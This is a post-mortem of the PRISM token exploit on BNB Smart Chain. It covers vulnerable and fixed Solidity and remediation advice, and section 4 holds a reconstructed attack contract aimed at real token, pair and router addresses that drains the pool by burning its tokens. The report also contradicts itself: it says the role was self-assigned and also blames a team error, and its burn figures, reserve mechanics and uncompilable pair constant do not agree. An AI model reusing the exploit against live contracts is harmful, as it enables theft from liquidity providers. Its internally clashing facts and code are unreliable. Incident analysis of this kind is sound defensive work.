# SixSeven & Prism Protocol — Business Logic Flow / LP Burn Price Manipulation Analysis

| Item | Details |
|------|------|
| **Date** | 2025-12-11 |
| **Protocol** | SixSeven & Prism Protocol (PRISM token) |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$193,000 (on-chain confirmed: 71.5 BNB ≈ $43,347 + estimated total from compound attack) |
| **Attacker** | [0x24A6...1647](https://bscscan.com/address/0x24A619dCe92c38d5Fef9733f9A37050742141647) |
| **Attack Contract** | [0x2E85...A1dd](https://bscscan.com/address/0x2E857bC277Eb049Fb4f27911e4c3498cEFC1A1dd) |
| **Attack Tx** | [0xcf7c...2237](https://bscscan.com/tx/0xcf7cacfe38dcf090bbfcc91634de364e62ef3715fdc8d6f69e855772b0862237) |
| **Role Assignment Tx** | [0x2387...42a6](https://bscscan.com/tx/0x23879edbd3366cdc774aaa72a8484b7f7ef641f68f01345764bf44d812d042a6) |
| **Vulnerable Contract** | [0x1284...cEE9](https://bscscan.com/address/0x1284c1f20A7F0322A5E17618f764F0d3CBAcCeE9) |
| **PancakeSwap Pair** | [0xd9bf...bbc7](https://bscscan.com/address/0xd9bf4716922e7189ebc96eb444bf00cdee1bbbc7) |
| **Root Cause** | Improper SniperManager role assignment + business logic flaw allowing direct LP pool burn |
| **Attack Block** | 71,280,114 (BSC) |
| **PoC Source** | [DeFiHackLabs — Not registered (Verichains post-mortem)](https://blog.verichains.io/p/post-mortem-prism-protocol-liquidity) |

---

## 1. Vulnerability Overview

Prism Protocol (PRISM token) suffered approximately $193,000 in losses on December 11, 2025, due to a combination of two flaws.

### Core Vulnerability Combination

| Layer | Vulnerability | Type |
|------|--------|------|
| Operational | Improper `SniperManager` role assignment to attack contract | Access control flaw |
| Code | `BurnSniperTokensBought()` can directly burn tokens from the LP pool address | Business logic flaw |
| Design | Conditions under which the LP pool can be flagged as a sniper | Design flaw |

**Attack Mechanism:** The attacker first self-assigned the `SniperManager` role to the attack contract, then flagged the PancakeSwap LP pool address as a sniper and burned 99% of the PRISM tokens held by the LP pool. This caused the PRISM/BNB ratio within the pool to shift to an extreme, allowing the attacker to sell a small amount of PRISM purchased beforehand and receive a large amount of BNB in profit.

This attack follows the same "LP token burn → pool price manipulation" pattern as the **SafeMoon March 2023** attack. Whereas SafeMoon's root cause was a missing `onlyOwner` check on the `burn()` function, Prism Protocol's root cause was an operational error in the role management system.

---

## 2. Vulnerable Code Analysis

### 2.1 BurnSniperTokensBought() — Allowing LP Pool Burns (Core Business Logic Flaw)

#### ❌ Vulnerable Code

```solidity
// [Vulnerability] onlySniperManager modifier: callable by any address registered in the SnipersManagers mapping
modifier onlySniperManager() {
    require(SnipersManagers[_msgSender()], "onlySniper: caller is not the tax fees manager");
    _;
}

// [Critical Flaw] This function can target any address passed as the `account` parameter for burning
// If the LP pool address (pancakePair) is marked as _isSniper[account] = true, tokens can be burned directly from the LP pool
function BurnSniperTokensBought(address account) external onlySniperManager {
    require(_isSniper[account], "Address Needs to be a sniper");

    // [Flaw 1] When account is the LP pool address, burns 99% of the LP pool's entire balance
    uint256 amountLeft = _balances[account] / 100;       // Leaves only 1% of the balance
    uint256 amountToBurn = _balances[account] * 99 / 100; // Sets 99% of the balance as the burn target
    _balances[account] = amountLeft;
    _balances[address(0xdead)] += amountToBurn;

    // [Flaw 2] Does not call sync() on the LP pool after burning — in practice, PancakeSwap auto-detects reserve discrepancies during swaps
    emit Transfer(account, address(0xdead), amountToBurn);
}

// [Flaw 3] The SniperManager role can be freely delegated by the current SniperManager
// No onlyOwner validation on who calls AddNewHelperToRemoveSniper
function AddNewHelperToRemoveSniper(address newManager) external onlySniperManager {
    SnipersManagers[newManager] = true; // No multi-step validation for role assignment
}
```

#### ✅ Fixed Code

```solidity
// [Fix 1] Explicitly block LP pool addresses from being burn targets
function BurnSniperTokensBought(address account) external onlySniperManager {
    require(_isSniper[account], "Address Needs to be a sniper");

    // [Defense] Exclude LP pool and DEX-related addresses from burn targets
    require(!automatedMarketPairs[account], "Cannot burn from LP pair");
    require(account != address(0), "Cannot burn from zero address");
    require(account != address(0xdead), "Cannot burn from dead address");
    require(account != address(this), "Cannot burn from contract");

    uint256 amountLeft = _balances[account] / 100;
    uint256 amountToBurn = _balances[account] * 99 / 100;
    _balances[account] = amountLeft;
    _balances[address(0xdead)] += amountToBurn;

    emit Transfer(account, address(0xdead), amountToBurn);
}

// [Fix 2] Restrict SniperManager role assignment to onlyOwner
// Before: onlySniperManager — current SniperManager can freely delegate the role
// After: onlyOwner — only the protocol owner can assign the role
function AddNewHelperToRemoveSniper(address newManager) external onlyOwner {
    require(newManager != address(0), "Zero address not allowed");
    require(!automatedMarketPairs[newManager], "LP pair cannot be manager");
    SnipersManagers[newManager] = true;
    emit SniperManagerAdded(newManager); // Emit event for transparency
}

// [Fix 3] Add role revocation function
function RemoveSniperManager(address manager) external onlyOwner {
    SnipersManagers[manager] = false;
    emit SniperManagerRemoved(manager);
}
```

**Issue:** The `BurnSniperTokensBought()` function was originally designed to defend against bot sniping immediately after launch. However, it contained no defensive logic for the case where the **LP pool address** is passed as the burn target. Combined with this, `AddNewHelperToRemoveSniper()` allowed the current SniperManager to arbitrarily add new SniperManagers, making it possible for an attacker to designate themselves as a SniperManager and then burn the LP pool.

---

### 2.2 _transfer() — Automatically Flagging Recipients as Snipers Immediately After Launch

```solidity
// [Auxiliary Vulnerability] Token recipients within the gap (10 minutes) after trading begins are automatically flagged as snipers
// The LP pool can also receive tokens during this period → the LP pool can end up with _isSniper[pancakePair] = true
function _transfer(address sender, address recipient, uint256 amount) internal virtual {
    // ... omitted ...
    if (block.timestamp <= _launchTime + gap && _launchTime != 0) {
        _isSniper[recipient] = true; // [Issue] recipient is also flagged as a sniper if it is the LP pool
    }
    // ... omitted ...
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker EOA: `0x24A619...1647`
- Deploy attack contract and transfer `0.01 BNB` (attack funds)
- **Role Assignment Tx** (Block 71,278,700 | 2025-12-11 13:45:44 UTC):
  Attacker EOA calls `AddNewHelperToRemoveSniper(0x2E85...A1dd)`
  → `SniperManager` role successfully granted to the attack contract

### 3.2 Execution Phase

```
┌──────────────────────────────────────────────────┐
│    Setup: Self-assign SniperManager role (Tx 1)  │
│    0x24A619... → AddNewHelperToRemoveSniper()    │
│    → SnipersManagers[attackContract] = true      │
└──────────────────────────┬───────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────┐
│    Attack contract execution (Tx 2 — Block 71,280,114) │
└──────────────────────────┬───────────────────────┘
                           │
                           ▼
           ┌───────────────────────────┐
           │  Step 1: Buy PRISM        │
           │  0.01 BNB → 67,750 PRISM  │
           │  PancakeSwap Router v2    │
           │  pancakePair balance:     │
           │  485,826,708 PRISM        │
           └──────────────┬────────────┘
                          │
                          ▼
    ┌─────────────────────────────────────────────┐
    │  Step 2: Flag LP pool address as sniper     │
    │  _isSniper[pancakePair] = true (pre-condition │
    │  or already flagged via early launch trade) │
    └─────────────────────┬───────────────────────┘
                          │
                          ▼
    ┌─────────────────────────────────────────────┐
    │  Step 3: BurnSniperTokensBought() × 4 times │
    │  Target: pancakePair address                │
    │                                             │
    │  Before burn: 485,826,708 PRISM             │
    │  Round 1: 485,826,708 × 99% → dead address │
    │  Rounds 2–4: Repeat burning remaining 1%   │
    │  After burn: 480 PRISM (≈ 0)               │
    │                                             │
    │  Result: Virtually all PRISM in LP burned  │
    └─────────────────────┬───────────────────────┘
                          │
                          ▼
    ┌─────────────────────────────────────────────┐
    │  Step 4: Sell PRISM → BNB                   │
    │  Holding 67,750 PRISM (bought in Step 1)    │
    │  pancakePair PRISM ≈ 480                    │
    │  → AMM price formula: BNB_out ≫ normal price │
    │                                             │
    │  Received: 71.53 BNB (~$43,347)             │
    └─────────────────────────────────────────────┘
```

**AMM Price Manipulation Principle (Uniswap x*y=k):**

```
Before burn: reserve_PRISM = 485,826,708,  reserve_BNB = R_bnb
After burn:  reserve_PRISM ≈ 480

[PancakeSwap processes swaps based on actual transfer events, not _balances]
→ When selling 67,750 PRISM:
  amountOut_BNB = (67,750 × 997 × R_bnb) / (480 × 1000 + 67,750 × 997)
  → Most of R_bnb can be received
```

### 3.3 Outcome

| Item | Value |
|------|------|
| Attack preparation funds | 0.01 BNB (~$6) |
| Received after attack | 71.53 BNB (~$43,347) |
| On-chain confirmed profit | ~71.52 BNB (~$43,341) |
| Total estimated loss (including compound attack) | ~$193,000 |
| PRISM tokens burned | 480,826,708 PRISM (~48% of total supply) |
| Blocks elapsed for attack | 1,414 blocks (preparation to execution, ~70 minutes) |

---

## 4. PoC Code Excerpt (Reproduction Logic)

> No official DeFiHackLabs PoC registered. Reconstructed based on Verichains post-mortem analysis.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// [Note] Actual attack reproduction flow (simplified)

interface IPrismToken {
    // Callable by any address holding the SniperManager role
    function BurnSniperTokensBought(address account) external;
    // Current SniperManager adds a new SniperManager
    function AddNewHelperToRemoveSniper(address newManager) external;
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IPancakeRouter {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract SixSevenPrismAttack {
    IPrismToken constant PRISM = IPrismToken(0x1284c1f20A7F0322A5E17618f764F0d3CBAcCeE9);
    address constant PANCAKE_PAIR = 0xd9bf4716922e7189ebc96eb444bf00cdee1bbbc7;
    IPancakeRouter constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    // [Step 0] Before deploying the attack contract,
    // the attacker EOA directly calls AddNewHelperToRemoveSniper(address(this)) on the PRISM contract
    // → This attack contract acquires the SniperManager role

    function attack() external payable {
        // [Step 1] Buy PRISM tokens with 0.01 BNB
        // Acquire a small amount of PRISM via PancakeSwap v2
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(PRISM);

        // BNB → PRISM swap: receive 67,750 PRISM
        ROUTER.swapExactETHForTokens{value: 0.01 ether}(
            0,    // No minimum output constraint
            path,
            address(this),
            block.timestamp
        );

        // [Step 2] Burn 99% of the LP pool's (pancakePair) PRISM balance 4 times in a row
        // Each call burns 99% of the remaining balance → effectively burns entire balance
        // Requires pancakePair address to be in _isSniper = true state
        for (uint i = 0; i < 4; i++) {
            PRISM.BurnSniperTokensBought(PANCAKE_PAIR);
            // Round 1: 485,826,708 → 4,858,267 PRISM (99% burned)
            // Round 2: 4,858,267   → 48,582 PRISM
            // Round 3: 48,582      → 485 PRISM
            // Round 4: 485         → 4 PRISM (≈ 0)
        }

        // [Step 3] Sell entire PRISM holdings for BNB
        // Since LP pool PRISM is effectively 0, the AMM price is extremely distorted
        // → A small amount of PRISM can receive most of the BNB in the LP pool
        uint256 prismBalance = PRISM.balanceOf(address(this)); // ~67,750 PRISM
        PRISM.approve(address(ROUTER), prismBalance);

        path[0] = address(PRISM);
        path[1] = WBNB;

        // PRISM → BNB: receive 71.53 BNB (~7,153x return on 0.01 BNB invested)
        ROUTER.swapExactTokensForETH(
            prismBalance,
            0,
            path,
            msg.sender, // Send profit directly to attacker EOA
            block.timestamp
        );
    }

    receive() external payable {}
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Improper SniperManager role assignment (operational error) | CRITICAL | CWE-732: Incorrect Permission Assignment for Critical Resource |
| V-02 | Missing burn guard logic for LP pool address | CRITICAL | CWE-284: Improper Access Control |
| V-03 | Self-delegatable SniperManager role structure | HIGH | CWE-269: Improper Privilege Management |
| V-04 | All early-trade recipients flagged as snipers (including LP pool) | HIGH | CWE-20: Improper Input Validation |
| V-05 | No event log on role assignment transactions (lack of transparency) | MEDIUM | CWE-778: Insufficient Logging |

### V-01: Improper SniperManager Role Assignment

- **Description:** The attacker EOA directly called `AddNewHelperToRemoveSniper(attackContract)` to grant the `SniperManager` role to the attack contract. This was not a code bug but rather an **operational error by the protocol's operations team** — it is presumed the team mistakenly recognized the malicious contract as a legitimate administrator, or the attacker impersonated a protocol operator.
- **Impact:** Holding SniperManager privileges enables calling `BurnSniperTokensBought()` and `AddNewHelperToRemoveSniper()` → LP pool burn and role propagation possible
- **Attack Condition:** Approval of `AddNewHelperToRemoveSniper()` call from an existing SniperManager

### V-02: Missing Burn Guard Logic for LP Pool Address

- **Description:** The `BurnSniperTokensBought()` function does not verify whether the `account` parameter is an LP pool address (`pancakePair`). Without an `automatedMarketPairs[account]` check or explicit address comparison, LP pool tokens are burned directly.
- **Impact:** 99% of PRISM in the LP pool burned → extreme AMM price distortion → attacker profit extraction
- **Attack Condition:** SniperManager privilege + LP pool in `_isSniper[pancakePair] = true` state

### V-03: Self-Delegatable SniperManager Role Structure

- **Description:** The `AddNewHelperToRemoveSniper()` function is protected by the `onlySniperManager` modifier, but the current SniperManager can grant the same role to any arbitrary address. Without an `onlyOwner` restriction, the role propagates without control.
- **Impact:** Any address that acquires the role can further propagate it, creating a cascading structure
- **Attack Condition:** Compromise of just one SniperManager collapses the entire role system

### V-04: All Early-Trade Recipients Flagged as Snipers

- **Description:** Inside `_transfer()`, all token recipients within the `gap` (10 minutes) after launch are automatically marked as `_isSniper[recipient] = true`. Since the LP pool address can also receive tokens during this period, `pancakePair` can become flagged as a sniper.
- **Impact:** LP pool enters sniper state, satisfying the precondition for calling `BurnSniperTokensBought(pancakePair)`
- **Attack Condition:** Token transfer to LP pool occurs within 10 minutes of launch

### V-05: No Event Log on Role Assignment Transactions

- **Description:** The `AddNewHelperToRemoveSniper()` function does not emit an event when a new SniperManager is added. On-chain monitoring systems and security dashboards cannot detect role assignments in real time.
- **Impact:** Malicious role assignments cannot be detected immediately, delaying incident response
- **Attack Condition:** N/A (design flaw)

---

## 6. Remediation Recommendations

### Immediate Actions

#### 1. Block Burns from LP Pool Addresses

```solidity
function BurnSniperTokensBought(address account) external onlySniperManager {
    require(_isSniper[account], "Address Needs to be a sniper");

    // [Required Addition] LP pool and critical addresses cannot be burned
    require(!automatedMarketPairs[account], "Cannot burn LP pair tokens");
    require(account != address(this),       "Cannot burn contract balance");
    require(account != address(0),          "Cannot burn zero address");
    require(account != address(0xdead),     "Cannot burn dead address");

    uint256 amountLeft = _balances[account] / 100;
    uint256 amountToBurn = _balances[account] * 99 / 100;
    _balances[account] = amountLeft;
    _balances[address(0xdead)] += amountToBurn;
    emit Transfer(account, address(0xdead), amountToBurn);
}
```

#### 2. Restrict SniperManager Role Assignment to onlyOwner

```solidity
// [Before] onlySniperManager — role holders can freely propagate the role
// function AddNewHelperToRemoveSniper(address newManager) external onlySniperManager {

// [After] onlyOwner — only the protocol owner can assign the role
function AddNewHelperToRemoveSniper(address newManager) external onlyOwner {
    require(newManager != address(0), "Zero address");
    require(!automatedMarketPairs[newManager], "LP pair cannot be manager");
    SnipersManagers[newManager] = true;
    emit SniperManagerAdded(newManager); // Add event
}

// [New Addition] Role revocation function
function RemoveSniperManager(address manager) external onlyOwner {
    SnipersManagers[manager] = false;
    emit SniperManagerRemoved(manager);
}

event SniperManagerAdded(address indexed manager);
event SniperManagerRemoved(address indexed manager);
```

#### 3. Exclude LP Pool from Early Launch Sniper Flagging

```solidity
// Fix the automatic sniper flagging logic inside _transfer()
if (block.timestamp <= _launchTime + gap && _launchTime != 0) {
    // [Addition] Do not flag LP pool, contract itself, or excluded addresses as snipers
    if (!automatedMarketPairs[recipient] && !_isExcludedFromTaxesAndFees[recipient]) {
        _isSniper[recipient] = true;
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Role misassignment | Control admin functions via multisig wallet; apply timelock on role assignments |
| V-02: Unguarded LP burn | Add AMM pair address blacklist to `BurnSniperTokensBought()`; enforce `automatedMarketPairs` check |
| V-03: Role propagation structure | Use OpenZeppelin `AccessControl` for RBAC; restrict role delegation hierarchy |
| V-04: LP pool sniper flagging | Exclude `automatedMarketPairs` from sniper flagging targets |
| V-05: Missing events | Emit events on all role changes; establish on-chain monitoring system |

---

## 7. Lessons Learned

1. **LP pools must never be subject to privileged function operations:**
   DEX liquidity pools hold the most critical state within a protocol. Privileged functions such as burns, freezes, and forced transfers must be explicitly blocked from targeting LP pool addresses at the design stage. This is the same pattern repeated in both SafeMoon (2023) and Prism Protocol (2025).

2. **Role-based access control (RBAC) must also protect the role assignment system itself:**
   The fact that `onlySniperManager` protects `AddNewHelperToRemoveSniper()` does not make it safe. If a SniperManager can create another SniperManager, the compromise of a single account collapses the entire role system. Role assignment authority must always be restricted to a higher privilege level (Multisig, DAO).

3. **Operational security (OpSec) is as important as code security:**
   The direct cause of this incident was not a code bug but rather an **operational error by the team in misassigning the role**. Processes must be in place to verify the code of a target address before calling any admin function. Mandatory use of multisig and cold storage is essential to prevent the mistake of registering a malicious contract as a trusted administrator.

4. **Anti-sniper mechanisms can inadvertently include unintended addresses:**
   Automated sniper flagging logic immediately after launch is simple and indiscriminate. Designers often fail to recognize that this logic can flag LP pools, routers, and contract addresses as well. Automated security features must be designed with stricter exception handling.

5. **Event logs are security infrastructure:**
   Without event logs for administrative operations such as role changes, privilege grants, and blacklist additions, on-chain monitoring systems cannot detect pre-attack steps. The Prism Protocol role assignment transaction was executed silently without events, going undetected. All admin functions that change state must emit events.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | Analysis Estimate | On-Chain Actual | Match |
|------|------------|-------------|-----------|
| Initial PRISM purchase amount | 67,750 PRISM | 67,750.001570634 PRISM | ✅ Match |
| PRISM remaining in LP after burn | ~480 PRISM | 480 PRISM | ✅ Match |
| BNB received after sale | ~71.5 BNB | 71.53432333 BNB | ✅ Match |
| Attack investment | 0.01 BNB | 0.01 BNB | ✅ Match |
| Attack block | 71,280,114 | 71,280,114 | ✅ Match |

### 8.2 On-Chain Event Log Sequence

| Order | Event | Originating Contract | Details |
|------|--------|-------------|------|
| 1 | `AddNewHelperToRemoveSniper` call | PrismToken | SniperManager role granted to attack contract (Tx: 0x2387...42a6, Block 71,278,700) |
| 2 | `swapExactETHForTokens` | PancakeRouter | 0.01 BNB → 67,750 PRISM swap |
| 3 | `Transfer` (LP → dead) × 4 times | PrismToken | BurnSniperTokensBought() — repeated LP pool burns |
| 4 | `Sync` | PancakePair | Pool reserve update reflected |
| 5 | `swapExactTokensForETH` | PancakeRouter | 67,750 PRISM → 71.53 BNB sale |

### 8.3 Precondition Verification

| Item | State Before Attack | Verification Method |
|------|------------|---------|
| `SnipersManagers[attackContract]` | `false` | Query state before block 71,278,700 |
| `_isSniper[pancakePair]` | `true` | Automatically flagged via LP receipt within 10 minutes of launch |
| LP pool PRISM balance | 485,826,708 PRISM | As of block 71,280,113 |
| Attacker EOA BNB balance | 0.01+ BNB | Preparation funds before attack execution |

---

*This document was prepared based on the Verichains post-mortem report and BSCScan on-chain data.*
*Reference: [Verichains Post-Mortem](https://blog.verichains.io/p/post-mortem-prism-protocol-liquidity)*